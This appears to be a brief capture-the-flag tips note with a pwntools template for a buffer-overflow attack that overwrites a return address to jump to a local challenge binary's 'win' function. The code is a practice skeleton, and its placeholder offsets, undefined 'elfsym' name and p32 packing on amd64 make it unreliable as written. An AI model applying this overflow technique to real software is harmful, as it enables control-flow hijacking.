Just a list of tips to help when tackling problems!

Basic code snippit below, copy and paste as needed
from pwn import *

p = process ("./chall_##")

context.arch = "amd64" #if 64 bit calling convention, this will save you a headache

p.recv()
payload = b''
payload+= (0xABCDE - 0xEFG + 0xBFR) * b'A' #figure out where you have to go, do the math in parenthesis!
elf = ELF("./chall_##") #used to call the methods in system, other ways to do involve getting the addr, this works too
payload += p32(elfsym.win)

#make sure you send however many lines your input is expecting -1
p.sendline("andyrulz")

#now, send your final line including the payload.
p.sendline(payload)

p.interactive()
ls
